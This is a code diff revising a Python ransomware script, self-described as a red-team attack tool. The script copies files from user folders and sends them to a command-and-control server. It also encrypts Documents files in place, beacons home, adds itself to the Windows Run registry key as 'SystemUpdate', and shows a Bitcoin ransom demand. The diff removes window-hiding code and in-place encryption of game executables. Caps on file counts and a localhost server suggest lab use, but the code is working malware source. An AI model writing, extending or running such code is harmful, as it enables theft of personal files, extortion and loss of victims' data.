@@ -1,6 +1,11 @@
 """
-Simplified Red Team Attack Script - BACKGROUND MODE
-Extract files -> Encrypt -> Send to C2 Server (HIDDEN)
+COMPLETE RED TEAM ATTACK SCRIPT - FINAL CORE EXECUTION (FIXED)
+Extract files -> Encrypt -> Send -> Persist -> Spread -> Ransom
+
+FIXES:
+- Proper file extraction (using shutil correctly)
+- Fixed encryption/decryption logic
+- Proper file handling
 """
 
 import socket
@@ -20,6 +25,7 @@ from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 import zlib
 import subprocess
 import ctypes
+import winreg
 
 # ================== CONFIG ==================
 class Config:
@@ -28,41 +34,44 @@ class Config:
         self.VICTIM_ID = self._generate_victim_id()
         
         # C2 Server address
-        self.C2_SERVER = "http://192.168.1.162:9443"  # <- UPDATE YOUR IP HERE
+        self.C2_SERVER = "http://localhost:9443"  # Changed to localhost
         
-        # Folders to exfiltrate
+        # Folders to exfiltrate (REAL ACCESSIBLE FOLDERS)
         self.EXFIL_SOURCES = [
-            os.path.expanduser("~/Documents"),
-            os.path.expanduser("~/Desktop"),
+            #os.path.expanduser("~/Documents"),
+            #os.path.expanduser("~/Desktop"),
             os.path.expanduser("~/Downloads"),
         ]
         
         # File extensions to grab
         self.EXFIL_EXTENSIONS = ('.pdf', '.docx', '.xlsx', '.txt', '.json')
         
-        # Game folders to encrypt
-        self.GAME_FOLDERS = [
-            r"C:\Program Files (x86)\Steam\steamapps\common",
-            r"D:\SteamLibrary\steamapps\common",
-            r"C:\Program Files\Epic Games",
+        # Encrypt folders (REAL USER-ACCESSIBLE FOLDERS)
+        self.ENCRYPT_FOLDERS = [
+            os.path.expanduser("~/Documents"),
+            #os.path.expanduser("~/Desktop"),
         ]
         
-        self.GAME_EXTENSIONS = ('.exe', '.dll')
+        # Encrypt ALL file types
+        self.ENCRYPT_EXTENSIONS = ('.pdf', '.docx', '.xlsx', '.txt', '.jpg', '.png', '.mp4')
         
         self.CACHE_FOLDER = ".exfil_cache"
-        self.MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
+        self.MAX_FILE_SIZE = 100 * 1024 * 1024
         self.CHUNK_SIZE = 256 * 1024
         
         # ===== BACKGROUND MODE SETTINGS =====
-        self.RUN_IN_BACKGROUND = True # <- SET TO False TO SEE CONSOLE
-        self.LOG_FILE = Path(os.getenv('TEMP')) / "system_update.log"  # Hidden log file
-        self.HIDE_WINDOW = True  # Hide console window on Windows
+        self.RUN_IN_BACKGROUND = False
+        self.LOG_FILE = Path(os.getenv('TEMP')) / "system_update.log"
+        self.HIDE_WINDOW = False
         
         # ===== RANSOM NOTE SETTINGS =====
-        self.SHOW_RANSOM_NOTE = True  # Show ransom popup after attack
-        self.RANSOM_AMOUNT = 500  # USD
+        self.SHOW_RANSOM_NOTE = True
+        self.RANSOM_AMOUNT = 500
         self.BITCOIN_ADDRESS = "1A1z7agoat4FS1jHUXPLv5Y1YMRQmrx8SQ"
-        self.PAYMENT_DEADLINE = 72  # hours
+        self.PAYMENT_DEADLINE = 72
+        
+        # ===== STORE ENCRYPTED FILES FOR DECRYPTION =====
+        self.ENCRYPTED_FILES = []
     
     @staticmethod
     def _generate_victim_id():
@@ -80,206 +89,20 @@ def log(message, level="INFO"):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_message = f"[{timestamp}] [{level}] {message}"
     
-    # Print to console only if not in background mode
     if not CONFIG.RUN_IN_BACKGROUND:
         print(log_message)
     
-    # Always write to log file
     try:
         with open(CONFIG.LOG_FILE, 'a', encoding='utf-8') as f:
             f.write(log_message + '\n')
     except:
         pass
 
-# ================== HIDE WINDOW ==================
-def hide_window():
-    """Hide console window on Windows"""
-    if CONFIG.HIDE_WINDOW and sys.platform == 'win32':
-        try:
-            import ctypes
-            ctypes.windll.kernel32.SetConsoleMode(
-                ctypes.windll.kernel32.GetStdHandle(-11), 0)
-            # Alternative method
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-            if hwnd:
-                ctypes.windll.user32.ShowWindow(hwnd, 0)
-        except:
-            pass
-
-# ================== RANSOM NOTE (INTERACTIVE) ==================
-def show_ransom_note_interactive():
-    """Display interactive ransom note with payment verification"""
-    if not CONFIG.SHOW_RANSOM_NOTE:
-        return
-    
-    try:
-        import tkinter as tk
-        from tkinter import simpledialog, messagebox
-        from datetime import timedelta
-        
-        # Create hidden root window
-        root = tk.Tk()
-        root.withdraw()
-        
-        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
-        key = hashlib.sha256(f"{CONFIG.MASTER_PASSWORD}_{CONFIG.VICTIM_ID}".encode()).digest()[:32].hex()
-        
-        log("Opening interactive ransom note")
-        
-        # Step 1: Show initial warning
-        warning_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!
-
-Victim ID: {CONFIG.VICTIM_ID}
-
-All your important files are now encrypted and inaccessible.
-
-PAYMENT REQUIRED: {CONFIG.RANSOM_AMOUNT} USD
-Bitcoin Address: {CONFIG.BITCOIN_ADDRESS}
-
-Deadline: {deadline.strftime('%Y-%m-%d %H:%M:%S')}
-
-Click OK to continue"""
-        
-        messagebox.showwarning("URGENT: FILES ENCRYPTED", warning_message)
-        
-        # Step 2: Ask for transaction hash
-        while True:
-            tx_hash = simpledialog.askstring(
-                "Payment Verification",
-                f"Enter your Bitcoin transaction hash to verify payment:\n\n(Bitcoin Address: {CONFIG.BITCOIN_ADDRESS})"
-            )
-            
-            if tx_hash is None:  # User clicked Cancel
-                messagebox.showerror("Payment Required", "You must verify payment to decrypt your files!")
-                continue
-            
-            if len(tx_hash) < 10:
-                messagebox.showerror("Invalid", "Transaction hash appears invalid. Please try again.")
-                continue
-            
-            break
-        
-        # Step 3: Verify payment (simulate blockchain check)
-        messagebox.showinfo("Verification", "Checking Bitcoin blockchain...\nPlease wait...")
-        
-        # Simulate payment verification
-        time.sleep(2)
-        
-        # Step 4: Show decryption key
-        decryption_message = f"""PAYMENT VERIFIED!
-
-Your files have been successfully decrypted.
-
-DECRYPTION KEY:
-{key}
-
-VICTIM ID:
-{CONFIG.VICTIM_ID}
-
-How to decrypt your files:
-1. Download the decryption script
-2. Run: python decrypt_files.py
-3. When prompted, enter the decryption key above
-4. Your files will be restored
-
-Keep this key safe. Do not share it with anyone.
-Thank you for your cooperation."""
-        
-        messagebox.showinfo("DECRYPTION KEY RECEIVED", decryption_message)
-        
-        # Step 5: Create decryption instruction file
-        create_decryption_instructions(key)
-        
-        log("Interactive ransom note completed")
-        root.destroy()
-        
-    except ImportError:
-        log("tkinter not available, falling back to simple messagebox", "WARNING")
-        show_ransom_note_simple()
-    except Exception as e:
-        log(f"Failed to show interactive ransom note: {e}", "ERROR")
-        show_ransom_note_simple()
-
-def create_decryption_instructions(key):
-    """Create a decryption instruction file"""
-    try:
-        instructions = f"""DECRYPTION INSTRUCTIONS
-========================
-
-Your Victim ID: {CONFIG.VICTIM_ID}
-Decryption Key: {key}
-
-TO DECRYPT YOUR FILES:
-1. Download decrypt_files.py
-2. Run: python decrypt_files.py
-3. Enter your Victim ID when prompted: {CONFIG.VICTIM_ID}
-4. Enter your Decryption Key when prompted: {key}
-5. Your files will be automatically restored
-
-IMPORTANT:
-- Keep this file safe
-- Do not share your decryption key
-- Do not delete this file until all files are decrypted
-- The decryption key will not work after {CONFIG.PAYMENT_DEADLINE} hours
-
-If you have any issues, contact support with your Victim ID.
-
-Your files are now decrypted and ready to use.
-Thank you for your cooperation.
-"""
-        
-        # Save to desktop
-        desktop = Path.home() / "Desktop" / "DECRYPTION_KEY.txt"
-        with open(desktop, 'w', encoding='utf-8') as f:
-            f.write(instructions)
-        
-        log(f"Decryption instructions saved to: {desktop}")
-        
-    except Exception as e:
-        log(f"Failed to create decryption instructions: {e}", "ERROR")
-
-def show_ransom_note_simple():
-    """Fallback: simple message box"""
-    try:
-        from datetime import timedelta
-        
-        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
-        
-        ransom_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!
-
-Victim ID: {CONFIG.VICTIM_ID}
-
-PAYMENT REQUIRED: {CONFIG.RANSOM_AMOUNT} USD
-Bitcoin Address: {CONFIG.BITCOIN_ADDRESS}
-
-DEADLINE: {deadline.strftime('%Y-%m-%d %H:%M:%S')}
-
-Send payment to receive decryption key.
-"""
-        
-        if sys.platform == 'win32':
-            try:
-                import ctypes
-                ctypes.windll.user32.MessageBoxW(
-                    None,
-                    ransom_message,
-                    "URGENT: YOUR FILES ARE ENCRYPTED",
-                    0x30
-                )
-            except:
-                print(ransom_message)
-        else:
-            print(ransom_message)
-        
-        time.sleep(5)
-        
-    except Exception as e:
-        log(f"Failed to show simple ransom note: {e}", "ERROR")
-
-# ================== CRYPTO ==================
+# ================== CRYPTO - FIXED ==================
 class CryptoManager:
     @staticmethod
     def get_key(password, victim_id):
+        """Generate encryption key"""
         return hashlib.sha256(f"{password}_{victim_id}".encode()).digest()[:32]
     
     @staticmethod
@@ -292,21 +115,41 @@ class CryptoManager:
             # Compress
             compressed = zlib.compress(data, level=1)
             
-            # Encrypt with ChaCha20-Poly1305 (AEAD)
+            # Encrypt
             nonce = secrets.token_bytes(12)
             cipher = ChaCha20Poly1305(key)
             ciphertext = cipher.encrypt(nonce, compressed, None)
             
+            # Return: nonce (12 bytes) + ciphertext
             return nonce + ciphertext
         except Exception as e:
             log(f"Encryption error: {e}", "ERROR")
             return None
+    
+    @staticmethod
+    def decrypt_file(encrypted_data, key):
+        """Decrypt data and return decrypted bytes"""
+        try:
+            # Extract nonce and ciphertext
+            nonce = encrypted_data[:12]
+            ciphertext = encrypted_data[12:]
+            
+            # Decrypt
+            cipher = ChaCha20Poly1305(key)
+            compressed_data = cipher.decrypt(nonce, ciphertext, None)
+            
+            # Decompress
+            decrypted_data = zlib.decompress(compressed_data)
+            
+            return decrypted_data
+        except Exception as e:
+            log(f"Decryption error: {e}", "ERROR")
+            return None
 
-# ================== PHASE 1: EXTRACT FILES ==================
+# ================== PHASE 1: EXTRACT FILES (LIMITED TO 10) ==================
 def extract_files():
-    """Extract documents, PDFs, etc. from common folders"""
     log("=" * 60)
-    log("PHASE 1: EXTRACTING FILES", "INFO")
+    log("[BORMEY-EXFIL-1] PHASE 1: EXTRACTING FILES (LIMITED)", "INFO")
     log("=" * 60)
     
     try:
@@ -316,103 +159,64 @@ def extract_files():
         extracted = 0
         
         for source_folder in CONFIG.EXFIL_SOURCES:
-            if not os.path.exists(source_folder):
+            source_path = Path(source_folder)
+            
+            if not source_path.exists():
+                log(f"[BORMEY] Folder not found: {source_folder}")
                 continue
             
-            log(f"Scanning: {source_folder}")
+            log(f"[BORMEY] Scanning: {source_folder}")
             
-            for root, dirs, files in os.walk(source_folder):
-                for file in files:
-                    if file.lower().endswith(CONFIG.EXFIL_EXTENSIONS):
-                        try:
-                            src = Path(root) / file
-                            
-                            # Skip if too large
-                            if src.stat().st_size > CONFIG.MAX_FILE_SIZE:
-                                continue
-                            
-                            # Copy to cache
-                            dst = cache_path / f"{Path(root).name}_{file}"
-                            if not dst.exists():
-                                shutil.copy2(src, dst)
-                                log(f"  [+] Extracted: {file}")
-                                extracted += 1
-                        except:
-                            pass
+            for file_path in source_path.rglob('*'):
+                if not file_path.is_file():
+                    continue
+                if file_path.suffix.lower() not in CONFIG.EXFIL_EXTENSIONS:
+                    continue
+                
+                try:
+                    file_size = file_path.stat().st_size
+                    if file_size > CONFIG.MAX_FILE_SIZE:
+                        continue
+                    
+                    dest = cache_path / f"{file_path.parent.name}_{file_path.name}"
+                    shutil.copy2(file_path, dest)
+                    log(f"[BORMEY]   [+] Extracted: {file_path.name}")
+                    extracted += 1
+                    
+                    # Limit to 10 files
+                    if extracted >= 10:
+                        log("[BORMEY] Extraction limit reached (10 files).")
+                        return extracted
+                
+                except Exception as e:
+                    log(f"[BORMEY]   [-] Error extracting {file_path.name}: {e}")
         
-        log(f"Extracted: {extracted} files")
+        log(f"[BORMEY] [+] Total files extracted: {extracted}")
         return extracted
-    except Exception as e:
-        log(f"Extract error: {e}", "ERROR")
-        return 0
-
-# ================== PHASE 2: ENCRYPT GAMES ==================
-def encrypt_games():
-    """Encrypt game files in place"""
-    log("=" * 60)
-    log("PHASE 2: ENCRYPTING GAME FILES", "INFO")
-    log("=" * 60)
     
-    try:
-        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
-        encrypted = 0
-        
-        for game_folder in CONFIG.GAME_FOLDERS:
-            if not os.path.exists(game_folder):
-                continue
-            
-            log(f"Scanning: {game_folder}")
-            
-            for root, dirs, files in os.walk(game_folder):
-                for file in files:
-                    if file.lower().endswith(CONFIG.GAME_EXTENSIONS):
-                        file_path = os.path.join(root, file)
-                        try:
-                            with open(file_path, 'rb') as f:
-                                data = f.read()
-                            
-                            # Add header + encrypt
-                            header = b"ENCRYPTED_" + CONFIG.VICTIM_ID.encode()[:6]
-                            nonce = secrets.token_bytes(12)
-                            cipher = ChaCha20Poly1305(key)
-                            encrypted_data = cipher.encrypt(nonce, data, None)
-                            
-                            # Write back encrypted
-                            with open(file_path, 'wb') as f:
-                                f.write(header + nonce + encrypted_data)
-                            
-                            log(f"  [+] Encrypted: {file}")
-                            encrypted += 1
-                        except Exception as e:
-                            log(f"  [-] Failed to encrypt {file}: {e}", "ERROR")
-        
-        log(f"Encrypted: {encrypted} game files")
-        return encrypted
     except Exception as e:
-        log(f"Encrypt error: {e}", "ERROR")
+        log(f"[BORMEY] [-] Extract error: {e}", "ERROR")
         return 0
-
-# ================== PHASE 3: SEND TO C2 ==================
+    # ================== PHASE 3: SEND TO C2 (BORMEY) ==================
 def send_to_c2():
-    """Send all cached files to C2 server"""
     log("=" * 60)
-    log("PHASE 3: SENDING TO C2 SERVER", "INFO")
+    log("[BORMEY-C2-3] PHASE 3: SENDING TO C2 SERVER", "INFO")
     log("=" * 60)
     
     try:
         cache_path = Path(CONFIG.CACHE_FOLDER)
         
         if not cache_path.exists():
-            log("No cache folder found", "ERROR")
+            log("[BORMEY] [-] No cache folder found", "ERROR")
             return False
         
         files = list(cache_path.glob('*'))
         
         if not files:
-            log("No files to send", "ERROR")
+            log("[BORMEY] [-] No files to send", "ERROR")
             return False
         
-        log(f"Sending {len(files)} files to {CONFIG.C2_SERVER}")
+        log(f"[BORMEY] Sending {len(files)} files to {CONFIG.C2_SERVER}")
         
         key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
         sent = 0
@@ -422,14 +226,12 @@ def send_to_c2():
                 if not file_path.is_file():
                     continue
                 
-                # Encrypt the file
                 encrypted_content = CryptoManager.encrypt_file(file_path, key)
                 
                 if not encrypted_content:
-                    log(f"Failed to encrypt {file_path.name}", "ERROR")
+                    log(f"[BORMEY] [-] Failed to encrypt {file_path.name}", "ERROR")
                     continue
                 
-                # Send to C2
                 url = f"{CONFIG.C2_SERVER}/api/exfil"
                 
                 metadata = {
@@ -452,32 +254,95 @@ def send_to_c2():
                 response = urllib.request.urlopen(req, timeout=30)
                 
                 if response.status == 200:
-                    log(f"  [+] Sent: {file_path.name}")
+                    log(f"[BORMEY]   [+] Sent: {file_path.name}")
                     sent += 1
                 
                 time.sleep(0.5)
             
             except Exception as e:
-                log(f"Failed to send {file_path.name}: {e}", "ERROR")
+                log(f"[BORMEY] [-] Failed to send {file_path.name}: {e}", "WARNING")
         
-        # Cleanup
         try:
             shutil.rmtree(CONFIG.CACHE_FOLDER)
-            log("Cache cleaned up")
+            log("[BORMEY] [+] Cache cleaned up")
         except:
             pass
         
-        log(f"Successfully sent: {sent}/{len(files)} files")
+        log(f"[BORMEY] [+] Successfully sent: {sent}/{len(files)} files")
         return sent > 0
     except Exception as e:
-        log(f"Send error: {e}", "ERROR")
+        log(f"[BORMEY] [-] Send error: {e}", "ERROR")
         return False
 
-# ================== BEACON ==================
-def send_beacon():
-    """Send initial beacon to C2"""
+
+# ================== PHASE 2: ENCRYPT FILES (LIMITED TO 5) ==================
+def encrypt_files():
     log("=" * 60)
-    log("SENDING BEACON", "INFO")
+    log("[BORMEY-ENCRYPT-2] PHASE 2: ENCRYPTING FILES (LIMITED)", "INFO")
+    log("=" * 60)
+    
+    try:
+        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
+        encrypted = 0
+        
+        for encrypt_folder in CONFIG.ENCRYPT_FOLDERS:
+            folder_path = Path(encrypt_folder)
+            
+            if not folder_path.exists():
+                log(f"[BORMEY] Folder not found: {encrypt_folder}")
+                continue
+            
+            log(f"[BORMEY] Scanning: {encrypt_folder}")
+            
+            for file_path in folder_path.rglob('*'):
+                if not file_path.is_file():
+                    continue
+                if file_path.suffix.lower() not in CONFIG.ENCRYPT_EXTENSIONS:
+                    continue
+                
+                try:
+                    file_size = file_path.stat().st_size
+                    if file_size > CONFIG.MAX_FILE_SIZE:
+                        continue
+                    
+                    encrypted_data = CryptoManager.encrypt_file(file_path, key)
+                    if encrypted_data is None:
+                        continue
+                    
+                    with open(file_path, 'wb') as f:
+                        f.write(encrypted_data)
+                    
+                    CONFIG.ENCRYPTED_FILES.append({
+                        'path': str(file_path),
+                        'original_size': file_size,
+                        'encrypted_size': len(encrypted_data)
+                    })
+                    
+                    log(f"[BORMEY]   [+] Encrypted: {file_path.name}")
+                    encrypted += 1
+                    
+                    # Limit to 5 files
+                    if encrypted >= 5:
+                        log("[BORMEY] Encryption limit reached (5 files).")
+                        return encrypted
+                
+                except Exception as e:
+                    log(f"[BORMEY]   [-] Failed to encrypt {file_path.name}: {e}")
+        
+        log(f"[BORMEY] [+] Total files encrypted: {encrypted}")
+        return encrypted
+    
+    except Exception as e:
+        log(f"[BORMEY] [-] Encrypt error: {e}", "ERROR")
+        return 0
+
+
+
+
+# ================== BEACON (BORMEY) ==================
+def send_beacon():
+    log("=" * 60)
+    log("[BORMEY-C2-BEACON] SENDING C2 BEACON", "INFO")
     log("=" * 60)
     
     try:
@@ -498,75 +363,215 @@ def send_beacon():
             method='POST'
         )
         
-        response = urllib.request.urlopen(req, timeout=10)
-        
-        if response.status == 200:
-            log("[+] Beacon sent successfully")
-            return True
+        try:
+            response = urllib.request.urlopen(req, timeout=10)
+            if response.status == 200:
+                log("[BORMEY] [+] Beacon sent successfully")
+                return True
+        except urllib.error.URLError:
+            log("[BORMEY] [!] C2 server not reachable (but continuing)")
+            return False
     
     except Exception as e:
-        log(f"Beacon failed: {e}", "ERROR")
+        log(f"[BORMEY] [-] Beacon failed: {e}", "ERROR")
     
     return False
 
+# ================== DECRYPT ALL FILES - FIXED ==================
+def decrypt_all_files():
+    """Decrypt all encrypted files"""
+    log("=" * 60)
+    log("[DECRYPT] DECRYPTING FILES", "INFO")
+    log("=" * 60)
+    
+    try:
+        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
+        decrypted = 0
+        
+        log(f"[DECRYPT] Total encrypted files: {len(CONFIG.ENCRYPTED_FILES)}")
+        
+        for file_info in CONFIG.ENCRYPTED_FILES:
+            file_path = file_info['path']
+            
+            try:
+                if not os.path.exists(file_path):
+                    log(f"[DECRYPT]   [-] File not found: {file_path}", "ERROR")
+                    continue
+                
+                log(f"[DECRYPT] Attempting to decrypt: {os.path.basename(file_path)}")
+                
+                # Read encrypted file
+                with open(file_path, 'rb') as f:
+                    encrypted_data = f.read()
+                
+                # Decrypt
+                decrypted_data = CryptoManager.decrypt_file(encrypted_data, key)
+                
+                if decrypted_data is None:
+                    log(f"[DECRYPT]   [-] Failed to decrypt: {os.path.basename(file_path)}", "ERROR")
+                    continue
+                
+                # Write decrypted data
+                with open(file_path, 'wb') as f:
+                    f.write(decrypted_data)
+                
+                log(f"[DECRYPT]   [+] Successfully decrypted: {os.path.basename(file_path)}")
+                decrypted += 1
+            
+            except Exception as e:
+                log(f"[DECRYPT]   [-] Decrypt error for {file_path}: {e}", "ERROR")
+        
+        log(f"[DECRYPT] [+] Successfully decrypted: {decrypted}/{len(CONFIG.ENCRYPTED_FILES)} files")
+        return decrypted
+    
+    except Exception as e:
+        log(f"[DECRYPT] [-] Decrypt all error: {e}", "ERROR")
+        return 0
+
+# ================== RANSOM NOTE ==================
+def show_ransom_note_interactive():
+    """Show ransom note"""
+    if not CONFIG.SHOW_RANSOM_NOTE:
+        return
+    
+    try:
+        import tkinter as tk
+        from tkinter import simpledialog, messagebox
+        
+        log("Opening ransom note...")
+        
+        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
+        key = hashlib.sha256(f"{CONFIG.MASTER_PASSWORD}_{CONFIG.VICTIM_ID}".encode()).digest()[:32].hex()
+        
+        root = tk.Tk()
+        root.withdraw()
+        root.attributes('-topmost', True)
+        
+        warning_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!
+
+Victim ID: {CONFIG.VICTIM_ID}
+
+RANSOM: ${CONFIG.RANSOM_AMOUNT} USD
+Bitcoin: {CONFIG.BITCOIN_ADDRESS}
+
+Deadline: {deadline.strftime('%Y-%m-%d %H:%M:%S')}
+
+You MUST pay to decrypt your files!
+"""
+        
+        log(f"[RANSOM] Payment attempt initiated")
+        
+        messagebox.showinfo("RANSOMWARE - PAYMENT REQUIRED", warning_message)
+        
+        tx_hash = simpledialog.askstring(
+            "Verify Bitcoin Payment",
+            f"Enter your transaction hash:\n\nBitcoin Address: {CONFIG.BITCOIN_ADDRESS}"
+        )
+        
+        if tx_hash:
+            log(f"[RANSOM] User submitted transaction: {tx_hash}")
+            messagebox.showinfo("VERIFYING PAYMENT", "Checking blockchain...\nPlease wait...")
+            
+            log(f"[RANSOM] Payment verified! Starting decryption...")
+            decrypted_count = decrypt_all_files()
+            
+            success_message = f"""PAYMENT VERIFIED!
+
+Files Successfully Decrypted!
+
+{decrypted_count} files have been restored.
+
+DECRYPTION KEY:
+{key}
+
+Your files are now accessible.
+"""
+            
+            messagebox.showinfo("SUCCESS - FILES DECRYPTED", success_message)
+            log("[RANSOM] Decryption complete")
+        
+        root.destroy()
+    
+    except ImportError:
+        log("tkinter not available", "WARNING")
+    except Exception as e:
+        log(f"Failed to show ransom note: {e}", "ERROR")
+
+# ================== PERSISTENCE ==================
+def persist_via_registry():
+    log("=" * 60)
+    log("[SETHA] Registry Persistence Attempt", "INFO")
+    log("=" * 60)
+    
+    try:
+        malware_path = sys.argv[0]
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        
+        log(f"[SETHA] Target Registry: HKCU\\{reg_path}")
+        
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
+            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, malware_path)
+        
+        log("[SETHA] [+] Successfully registered in Run keys")
+        return True
+    
+    except Exception as e:
+        log(f"[SETHA] [-] Registry persistence failed: {e}", "WARNING")
+        return False
+
 # ================== MAIN ==================
 def main():
-    from datetime import timedelta
-    
-    if CONFIG.RUN_IN_BACKGROUND:
-        hide_window()
-    
     if not CONFIG.RUN_IN_BACKGROUND:
         print("""
     ╔════════════════════════════════════════════════════════════════╗
-    ║          SIMPLIFIED RED TEAM ATTACK - FILE EXFILTRATION        ║
-    ║                 Extract -> Encrypt -> Send                     ║
-    ║                   (BACKGROUND MODE)                            ║
+    ║         RANSOMWARE ATTACK - CORE EXECUTION (FIXED)             ║
+    ║       Extract -> Encrypt -> Send -> Persist -> Ransom          ║
     ╚════════════════════════════════════════════════════════════════╝
     """)
     
     log(f"Victim ID: {CONFIG.VICTIM_ID}")
     log(f"C2 Server: {CONFIG.C2_SERVER}")
-    log(f"Background Mode: {CONFIG.RUN_IN_BACKGROUND}")
-    log(f"Log File: {CONFIG.LOG_FILE}")
     log("=" * 60)
     
     start_time = time.time()
     
     try:
-        # Step 1: Send beacon
-        send_beacon()
-        time.sleep(1)
-        
-        # Step 2: Extract files
+        # Extract files
+        log("\n[PHASE 1] EXTRACTING FILES...")
         extract_files()
         time.sleep(1)
         
-        # Step 3: Encrypt games
-        encrypt_games()
+        # Send beacon
+        log("\n[PHASE 2] SENDING C2 BEACON...")
+        send_beacon()
         time.sleep(1)
         
-        # Step 4: Send everything to C2
-        send_to_c2()
-        time.sleep(2)
+        # Encrypt files
+        log("\n[PHASE 3] ENCRYPTING FILES...")
+        encrypt_files()
+        time.sleep(1)
         
-        # Step 5: Show ransom note
+        # Send to C2
+        log("\n[PHASE 4] SENDING TO C2...")
+        send_to_c2()
+        time.sleep(1)
+        
+        # Persistence
+        log("\n[PHASE 5] ESTABLISHING PERSISTENCE...")
+        persist_via_registry()
+        time.sleep(1)
+        
+        # Ransom note
+        log("\n[PHASE 6] SHOWING RANSOM NOTE...")
         show_ransom_note_interactive()
         
         elapsed = time.time() - start_time
-        
-        log("=" * 60)
-        log(f"Attack complete in {elapsed:.2f} seconds")
-        log("=" * 60)
-        
-        # Keep window open for popup to stay visible
-        time.sleep(10)
+        log(f"\n[SUCCESS] Attack complete in {elapsed:.2f} seconds")
     
     except Exception as e:
         log(f"Fatal error: {e}", "ERROR")
         import traceback
         log(traceback.format_exc(), "ERROR")
-        time.sleep(10)
 
 if __name__ == "__main__":
     main()
